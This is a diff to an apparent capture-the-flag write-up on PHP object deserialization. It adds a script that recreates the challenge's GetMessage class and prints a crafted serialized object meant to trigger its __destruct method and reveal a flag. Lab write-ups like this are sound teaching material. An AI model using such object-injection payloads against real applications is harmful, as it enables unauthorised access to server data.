@@ -52,9 +52,38 @@ According to [php documentation](https://www.php.net/manual/en/language.oop5.mag
 
 Our goal is to read the flag. We cannot directly create a serialized object from the `GetMessage` class because the constructor takes a parameter and checks if its value is equal to "HelloBooooooy". If it is, the script will terminate immediately, and the `__destruct()` method will not be called. On the other hand, if we change the value from "HelloBooooooy" to "Hello", the constructor will save it in the `receive` property, and the `__destruct()` method will be called. However, when it checks the value, the script will terminate again using the `die()` function. Both approaches will fail to read the flag.
 
-I Generated this serialized data to test : 
+I generate this script to create a serialized data for testing: 
 ```php
-O:10:"GetMessage":1:{s:7:"receive";s:13:"HelloBooooooy";}
+<?php
+
+class GetMessage {
+    function __construct($receive) {
+        if ($receive === "HelloBooooooy") {
+            die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
+        } else {
+            $this->receive = $receive;
+        }
+    }
+
+    function __toString() {
+        return $this->receive;
+    }
+
+    function __destruct() {
+        global $getflag;
+        if ($this->receive !== "HelloBooooooy") {
+            die("[FRIEND]: Hm.. you don't seem to be the friend I was waiting for..<br>");
+        } else {
+            if ($getflag) {
+                include("flag.php");
+                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG."<br>";
+            }
+        }
+    }
+}
+$obj = new GetMessage("Hello");
+// O:10:"GetMessage":1:{s:7:"receive";s:5:"Hello";}
+echo serialize($obj);
 ```
 
 
